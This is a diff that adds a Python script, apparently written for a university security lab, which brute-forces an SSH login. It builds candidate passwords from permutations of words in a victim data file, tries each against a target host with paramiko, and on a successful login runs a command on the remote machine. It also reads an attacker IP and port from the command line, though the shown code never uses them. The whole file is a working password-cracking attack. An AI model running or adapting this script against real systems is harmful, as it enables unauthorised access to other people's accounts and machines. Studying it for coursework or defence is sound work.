@@ -1,0 +1,40 @@
+#!/usr/bin/env python3
+import sys
+import paramiko
+import itertools
+
+def connect_ssh(password):
+    global victim_ip, victim_name
+    ssh_client = paramiko.SSHClient()
+    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    # try connection
+    try:  
+        ssh_client.connect(hostname=victim_ip, username=victim_name, password=password)
+        print("success")
+        stdin, stdout, stderr = ssh_client.exec_command("touch /home/csc2023/Desktop/test.txt")
+        print(stdout.readlines())
+        return True
+    except:
+        ssh_client.close()
+        return False
+def try_password():
+    with open('/home/csc2023/materials/victim.dat', 'r') as dat_file:
+    # with open('./test.dat', 'r') as dat_file:
+        dictionary = dat_file.read().split('\n')[0:-1]
+        idx_arr = [i for i in range(len(dictionary))]
+        for num_words in range(len(dictionary)):
+            combinations = itertools.permutations(idx_arr, num_words)
+            for comb in combinations:
+                s = ''
+                for idx in comb: s += dictionary[idx]
+                print(s)
+                if connect_ssh(s): return
+                
+
+# ./crack_attack <Victim IP> <Attacker IP> <Attacker port>
+victim_name = "csc2023"
+victim_ip = sys.argv[1]
+attacker_ip = sys.argv[2]
+attacker_port = (int)(sys.argv[3])
+try_password()
+# connect_ssh("csc2023")
